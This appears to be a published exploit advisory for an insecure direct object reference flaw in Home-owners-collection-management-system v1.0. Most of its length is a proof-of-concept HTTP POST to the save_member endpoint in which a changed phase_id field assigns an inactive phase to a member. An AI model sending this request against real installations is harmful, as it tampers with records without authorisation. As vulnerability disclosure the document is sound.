# Exploit Title: Home-owners-collection-management-system v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Home-owners-collection-management-system v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add a phase who is inactive to a member(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /hocms/classes/Master.php?f=save_member HTTP/1.1
...

------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="firstname"

Mark
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="middlename"

D
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="lastname"

Cooper
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="contact"

09123456789
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="phase_id"

2(CHANGE HERE)
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="block"

1
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="lot"

1
------WebKitFormBoundarybA3n4qir7MSNLBSp
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundarybA3n4qir7MSNLBSp--

```